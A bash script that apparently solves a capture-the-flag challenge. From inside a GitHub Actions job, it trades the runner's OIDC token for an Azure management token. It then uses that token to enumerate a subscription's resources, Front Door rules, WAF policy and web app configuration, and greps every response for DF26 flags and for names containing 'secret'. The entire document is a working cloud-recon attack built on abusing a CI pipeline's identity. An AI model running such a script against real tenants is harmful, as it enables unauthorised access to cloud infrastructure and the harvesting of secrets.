#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
MGMT="https://management.azure.com"
TEN=$AZURE_TENANT_ID

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
PMG=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
H=(-H "Authorization: Bearer $PMG"); echo "pmg len=${#PMG}"
D=/tmp/fd; mkdir -p "$D"; n=0
get(){ n=$((n+1)); local f="$D/$(printf '%03d' $n)_$1"; shift; curl -sS $M "${H[@]}" "$@" -o "$f"; local e=$(jq -r '.error.code//empty' "$f" 2>/dev/null); local h=$(grep -aoE "DF26\{[^}]*\}" "$f"|sort -u); echo "  $(basename "$f"): ${e:+ERR:$e}${h:+ <<<FLAG:$h}"; [ -n "$h" ] && grep -ao ".\{0,100\}DF26{[^}]*}" "$f"|head; }

PFX="$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers"
echo "=== list all resources (names+types) ==="
get resources.json "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=100"
jq -r '.value[]? | .type+"  "+.name' "$D/"*resources.json 2>/dev/null

echo "=== Front Door (cdn profile afd-tbl-prod) full tree ==="
get afd.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod?api-version=2023-05-01"
get afd_eps.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints?api-version=2023-05-01"
get afd_og.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/originGroups?api-version=2023-05-01"
get afd_rulesets.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/ruleSets?api-version=2023-05-01"
for rs in $(jq -r '.value[]?.name' "$D/"*afd_rulesets.json 2>/dev/null); do
  get "afd_rules_$rs.json" "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/ruleSets/$rs/rules?api-version=2023-05-01"
done
get afd_routes.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/afdEndpoints/tbl-storefront-prod/routes?api-version=2023-05-01"
get afd_secpol.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/securityPolicies?api-version=2023-05-01"
get afd_customdomains.json "$PFX/Microsoft.Cdn/profiles/afd-tbl-prod/customDomains?api-version=2023-05-01"

echo "=== WAF policy ==="
get waf.json "$PFX/Microsoft.Network/frontdoorWebApplicationFirewallPolicies/waftblstorefrontprod?api-version=2022-05-01"

echo "=== storefront app full + reporting app ==="
get storefront.json "$PFX/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01"
get storefront_cfg.json "$PFX/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01"
get storefront_meta.json "$PFX/Microsoft.Web/sites/app-tbl-storefront-prod/config?api-version=2022-03-01"
get asp.json "$PFX/Microsoft.Web/serverfarms/asp-tbl-prod?api-version=2022-03-01"

echo "=== grep DF26 across ALL ==="; grep -raoE "DF26\{[^}]*\}" "$D" 2>/dev/null | sort -u || echo "(none)"
echo "=== any names/tags mentioning flag/df26/secret ==="; grep -rainoE "\"(name|description|displayName)\":\"[^\"]*(flag|df26|secret|hint)[^\"]*\"" "$D" 2>/dev/null | head -20 || true
echo "FD DONE"; exit 0
